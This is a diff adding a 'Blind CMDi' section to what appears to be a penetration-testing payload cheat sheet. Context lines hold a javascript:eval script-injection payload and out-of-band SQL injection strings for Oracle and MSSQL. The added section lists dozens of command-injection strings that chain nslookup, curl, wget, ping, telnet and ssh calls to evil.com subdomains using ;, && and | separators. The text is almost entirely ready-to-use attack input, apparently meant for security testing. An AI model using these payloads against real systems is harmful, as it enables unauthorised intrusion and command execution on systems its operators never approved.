@@ -135,3 +135,49 @@ javascript:eval("var a=document.createElement('script');a.src='https://evil.com'
 ,1,1,1,1); SELECT UTL_INADDR.get_host_address('sqli-oracle19.evil.com');--
 ,1,1,1,1); exec master..xp_dirtree '//sqli-mssql19.evil.com/a';--
 ```
+
+## Blind CMDi
+```shell
+nslookup cmdi-nslookup1.evil.com
+curl cmdi-curl1.evil.com
+wget cmdi-wget1.evil.com
+ping -c 1 cmdi-ping1.evil.com
+telnet cmdi-telnet1.evil.com
+ssh cmdi-ssh1.evil.com
+nslookup cmdi-nslookup2.evil.com #
+curl cmdi-curl2.evil.com #
+wget cmdi-wget2.evil.com #
+ping -c 1 cmdi-ping2.evil.com #
+telnet cmdi-telnet2.evil.com #
+ssh cmdi-ssh2.evil.com #
+; nslookup cmdi-nslookup3.evil.com #
+; curl cmdi-curl3.evil.com #
+; wget cmdi-wget3.evil.com #
+; ping -c 1 cmdi-ping3.evil.com #
+; telnet cmdi-telnet3.evil.com #
+; ssh cmdi-ssh3.evil.com #
+ && nslookup cmdi-nslookup4.evil.com #
+ && curl cmdi-curl4.evil.com #
+ && wget cmdi-wget4.evil.com #
+ && ping -c 1 cmdi-ping4.evil.com #
+ && telnet cmdi-telnet4.evil.com #
+ && ssh cmdi-ssh4.evil.com #
+ | nslookup cmdi-nslookup5.evil.com | 
+ | curl cmdi-curl5.evil.com | 
+ | wget cmdi-wget5.evil.com | 
+ | ping -c 1 cmdi-ping5.evil.com | 
+ | telnet cmdi-telnet5.evil.com | 
+ | ssh cmdi-ssh5.evil.com | 
+ nslookup cmdi-nslookup6.evil.com
+ curl cmdi-curl6.evil.com
+ wget cmdi-wget6.evil.com
+ ping -c 1 cmdi-ping6.evil.com
+ telnet cmdi-telnet6.evil.com
+ ssh cmdi-ssh6.evil.com
+ nslookup cmdi-nslookup7.evil.com #
+ curl cmdi-curl7.evil.com #
+ wget cmdi-wget7.evil.com #
+ ping -c 1 cmdi-ping7.evil.com #
+ telnet cmdi-telnet7.evil.com #
+ ssh cmdi-ssh7.evil.com #
+```
